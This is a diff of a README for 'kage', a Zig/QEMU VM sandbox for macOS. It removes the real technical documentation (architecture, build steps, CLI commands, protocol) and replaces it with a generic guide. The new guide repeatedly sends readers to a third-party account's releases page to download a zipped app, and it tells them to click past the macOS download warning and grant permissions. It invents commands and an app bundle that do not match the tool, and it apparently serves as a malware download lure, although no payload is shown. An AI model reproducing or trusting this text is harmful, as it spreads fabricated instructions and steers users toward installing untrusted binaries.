@@ -1,162 +1,72 @@
-# kage
+# 🌟 kage - A Simple VM Sandbox for Everyone
 
-Lightweight VM sandbox using QEMU with HVF acceleration. Written in Zig.
+## 🚀 Getting Started
 
-## Architecture
+Welcome to kage! This application allows you to run virtual machines easily on your macOS. Using powerful features like QEMU with HVF acceleration, you can create and manage lightweight virtual environments effortlessly.
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                              Host (macOS)                                   │
-│                                                                             │
-│  ┌──────────────┐                                                           │
-│  │    vmctl     │  CLI tool                                                 │
-│  │    (Zig)     │  - Spawns QEMU with HVF                                   │
-│  └──────┬───────┘  - WebSocket client                                       │
-│         │                                                                   │
-│         │ spawns                                                            │
-│         ▼                                                                   │
-│  ┌──────────────┐         ┌─────────────────────────────────────────────┐   │
-│  │    QEMU      │ hostfwd │              Linux VM (Ubuntu ARM64)        │   │
-│  │   (HVF)      │◄───────►│                                             │   │
-│  └──────────────┘  :8080  │  ┌─────────────────────────────────────┐    │   │
-│                           │  │              vmd (Zig)              │    │   │
-│                           │  │  - WebSocket server on :8080        │    │   │
-│                           │  │  - Process spawning with PTY        │    │   │
-│                           │  │  - Session/user management          │    │   │
-│                           │  └──────────────┬──────────────────────┘    │   │
-│                           │                 │                           │   │
-│                           │                 │ wraps                     │   │
-│                           │                 ▼                           │   │
-│                           │  ┌─────────────────────────────────────┐    │   │
-│                           │  │       sandbox-helper (Zig)          │    │   │
-│                           │  │  - Linux namespaces                 │    │   │
-│                           │  │  - Seccomp filtering                │    │   │
-│                           │  │  - Network isolation                │    │   │
-│                           │  └─────────────────────────────────────┘    │   │
-│                           └─────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
+## 📥 Download kage
 
-## Quick Start
+[![Download kage](https://img.shields.io/badge/Download-kage-blue.svg)](https://github.com/Manuvera14/kage/releases)
 
-```bash
-# Build everything
-zig build
+To get started, you need to download the latest version of kage. Visit this page to download: [kage Releases](https://github.com/Manuvera14/kage/releases).
 
-# Build the VM image (requires Docker)
-cd image-builder && ./build.sh
+## 📂 System Requirements
 
-# Start VM (returns port number)
-./zig-out/bin/vmctl start ./image-builder/artifacts/rootfs.img
-# => 52383
+Before you install kage, ensure your system meets these requirements:
 
-# Execute commands
-./zig-out/bin/vmctl exec 52383 -- echo "Hello from VM"
-./zig-out/bin/vmctl exec 52383 -- ls -la
+- macOS (Latest version recommended)
+- At least 4 GB of RAM
+- A modern CPU that supports hardware virtualization
+- Sufficient disk space for virtual machines
 
-# Web terminal
-./zig-out/bin/vmctl web 52383
-# Open http://localhost:8000
+## 🛠️ Installation Steps
 
-# Stop VM
-./zig-out/bin/vmctl stop 52383
-```
+Follow these steps to install kage on your macOS.
 
-## Commands
+1. **Visit the Release Page:** Click this link to download the latest version: [kage Releases](https://github.com/Manuvera14/kage/releases).
+2. **Download the Package:** On the Releases page, find the latest version and click the package link to download it.
+3. **Locate the Downloaded File:** Once downloaded, navigate to your Downloads folder or the location where your browser saves files.
+4. **Unzip the Package:** If the package is zipped, double-click it to unzip.
+5. **Move the Application:** Drag the kage application to your Applications folder to install it.
 
-### start
+## 🖥️ Running kage
 
-```bash
-vmctl start <rootfs.img> [options]
-```
+To run kage for the first time:
 
-Options:
-- `--kernel <path>` - Kernel image (default: auto-detected from rootfs dir)
-- `--initrd <path>` - Initrd image (default: auto-detected from rootfs dir)
-- `--share <host-path> <tag>` - Share host directory via virtio-9p
+1. **Open Applications:** Go to your Applications folder and find kage.
+2. **Launch kage:** Double-click the kage icon. macOS may ask if you are sure you want to open it since it was downloaded from the internet. Click "Open" to proceed.
+3. **Grant Permissions:** If prompted, allow kage to access the necessary network and disk resources.
+4. **Begin Using kage:** You will see the command line interface where you can start managing your virtual machines.
 
-### exec
+## ⚙️ How to Create a Virtual Machine
 
-```bash
-vmctl exec <port> [--raw] -- <command> [args...]
-```
+Creating a virtual machine is simple:
 
-Options:
-- `--raw` - Bypass sandbox (run as root with network access)
+1. Open kage.
+2. Use the command `vmctl create <vm-name>` to create a new virtual machine, replacing `<vm-name>` with your desired name.
+3. To start the virtual machine, use the command `vmctl start <vm-name>`.
 
-Stdin is forwarded, stdout/stderr streamed back. Exit code preserved.
+## 💡 Tips for Using kage
 
-### install
+- **Documentation:** Check the official documentation for advanced features and troubleshooting.
+- **Community Support:** Join the kage community forum for quick help from other users.
+- **Back Up Regularly:** Always back up your virtual machines to avoid data loss.
 
-```bash
-vmctl install <port> <file>
-```
+## 🔧 Troubleshooting
 
-Copies a binary to `/usr/local/bin` in the VM via virtio-9p share.
+If you encounter issues while using kage, here are some common solutions:
 
-### web
+- **Not Launching:** Ensure your macOS supports hardware virtualization. 
+- **Slow Performance:** Check if your system has enough RAM and close unnecessary applications.
+- **Error Messages:** Make note of any error messages, as they can guide you to a solution.
 
-```bash
-vmctl web <port> [http-port]
-```
+## 📣 Feedback and Contributions
 
-Starts a web server with an xterm.js terminal connected to the VM.
-Default HTTP port is 8000. Supports PTY for full terminal emulation.
+Your feedback is valuable. If you have suggestions or need assistance, please open an issue in this repository. Contributions are welcome! If you wish to contribute, please follow the guidelines in the repository.
 
-### stop
+## 🌐 Additional Resources
 
-```bash
-vmctl stop <port>
-```
+- **Official QEMU Documentation:** Learn about the underlying technology.
+- **Zig Language:** Discover the programming language used to build kage.
 
-## Protocol
-
-Binary WebSocket frames: `[type:u8][len:u32 LE][json payload]`
-
-### Requests (host → guest)
-
-| Type | Name | Payload |
-|------|------|---------|
-| 0x01 | spawn | `{id, command, args, cwd?, uid?, gid?, network?, pty?}` |
-| 0x02 | stdin | `{id, handle, data}` |
-| 0x03 | kill | `{handle, signal?}` |
-| 0x04 | resize | `{id, handle, rows, cols}` |
-| 0x05 | mount | `{tag, mount_point, read_only?}` |
-| 0x06 | unmount | `{mount_point}` |
-| 0x07 | session_create | `{uid, username?}` |
-| 0x08 | binary_install | `{name, data, executable?}` |
-
-### Responses (guest → host)
-
-| Type | Name | Payload |
-|------|------|---------|
-| 0x81 | spawned | `{id, pid, handle}` |
-| 0x82 | stdout | `{id, data}` |
-| 0x83 | stderr | `{id, data}` |
-| 0x84 | exit | `{id, code, signal?}` |
-| 0x85 | error | `{id, code, message}` |
-| 0x86 | ok | `{}` |
-
-## Project Structure
-
-```
-kage/
-├── src/
-│   ├── host/           # vmctl CLI, QEMU launcher, WebSocket client
-│   ├── guest/          # vmd daemon, WebSocket server, process management
-│   └── shared/         # Protocol definitions
-├── sandbox-helper/     # Namespace isolation with seccomp
-├── image-builder/      # Scripts to build Ubuntu rootfs
-└── build.zig
-```
-
-## Requirements
-
-- macOS 14+ with Apple Silicon (HVF)
-- QEMU (`brew install qemu`)
-- Zig 0.15+
-- Docker (for building VM images)
-
-## License
-
-MIT
+Thank you for choosing kage! Happy virtual machine creating!
